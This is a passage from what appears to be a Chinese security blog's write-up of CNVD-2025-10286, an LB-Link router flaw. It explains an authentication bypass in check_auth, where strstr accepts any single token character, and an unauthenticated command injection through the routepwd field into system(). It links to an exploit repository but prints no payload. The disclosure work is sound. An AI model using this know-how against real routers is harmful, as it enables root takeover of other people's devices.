href="#开启远程web访问" class="headerlink" title="开启远程web访问"></a>开启远程web访问</h4><p><img src="/image/CNVD-2025-10286/1743736258710.png" alt="1743736258710"></p><p><img src="/image/CNVD-2025-10286/1743736252997.png" alt="1743736252997"></p><h3 id="2-未授权远程命令执行（命令注入）"><a href="#2-未授权远程命令执行（命令注入）" class="headerlink" title="2.未授权远程命令执行（命令注入）"></a>2.未授权远程命令执行（命令注入）</h3><p>在 <code>libblinkapi.so</code>的 <code>bs_setmanpwd</code>函数中存在命令注入漏洞，从而可以远程命令执行，获取路由器最高权限。</p><p><img src="/image/CNVD-2025-10286/1743736897631.png" alt="1743736897631"></p><h2 id="二、漏洞成因"><a href="#二、漏洞成因" class="headerlink" title="二、漏洞成因"></a>二、漏洞成因</h2><h3 id="1-认证绕过"><a href="#1-认证绕过" class="headerlink" title="1.认证绕过"></a>1.认证绕过</h3><p>在 <code>/etc/lighttpd/lighttpd.conf</code>中，请求的 URL 以 <code>/cgi-bin</code> 开头时，不管文件扩展名是什么，都当作 CGI 脚本并使用系统默认解释器执行。</p><p><img src="/image/CNVD-2025-10286/1743750283666.png" alt="1743750283666"></p><p>在 <code>/www/cgi-bin/lighttpd.cgi</code>的 <code>main</code>函数中，会先执行 <code>check_auth</code>函数检查请求中 <code>Authorization</code>字段，再进入 <code>share_func</code>函数。</p><p><img src="/image/CNVD-2025-10286/1743750298212.png" alt="1743750298212"></p><p>在 <code>/usr/lib/libblinkapi.so</code>的 <code>check_auth</code>函数中，错误的使用 <code>strstr</code>函数进行鉴权，攻击者只需使用 <code>/tmp/token</code> 中存在的一个字符，并设置在请求的 <code>Authorization</code>字段中便可进行绕过， <code>v1</code>为用户登录过后留下的 <code>token</code>，保存在 <code>/tmp/token</code>中，a1是攻击者请求中 <code>Authorization</code>字段。<code>share_fuc</code>会处理请求的内容将type字段的函数名交给其他函数进行处理。</p><p>（下面IDA反编译代码经过自写的脚本进行重命名，脚本会防止在 <code>/origin_file</code>文件夹下）</p><p><img src="/image/CNVD-2025-10286/1743750308254.png" alt="1743750308254"></p><h3 id="2-命令注入"><a href="#2-命令注入" class="headerlink" title="2.命令注入"></a>2.命令注入</h3><p>在 <code>/usr/lib/libblinkapi.so</code>的bs_SetManPwd函数中</p><p><code>v39</code>是经过前面处理得到的routepwd中的字符串，通过 <code>snprintf</code>拼接成 <code>chpasswd.sh root v39</code>的形式，然后直接执行 <code>system</code>。请求中的 <code>routepwd</code>类的值并未经过校验（校验功能经测试在前端）。</p><p><img src="/image/CNVD-2025-10286/1743750334483.png" alt="1743750334483"></p><p>通过对反编译代码的分析，攻击者的请求中需包含 <code>“cfg_type”</code>类（即反编译代码中v9）方能进入system所在的if分支。</p><p>（部分反编译代码如下，同样经过脚本进行重命名）</p><p>image<img src="/image/CNVD-2025-10286/1743750426122.png" alt="1743750426122"></p><p><img src="/image/CNVD-2025-10286/1743750379015.png" alt="1743750379015"></p><h2 id="三、详细过程"><a href="#三、详细过程" class="headerlink" title="三、详细过程"></a>三、详细过程</h2><p><a href="https://github.com/Exploo0Osion/LB-Link_unauth">https://github.com/Exploo0Osion/LB-Link_unauth</a></p>]]></content>
      
      
      <categories>
          
          <category> router </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
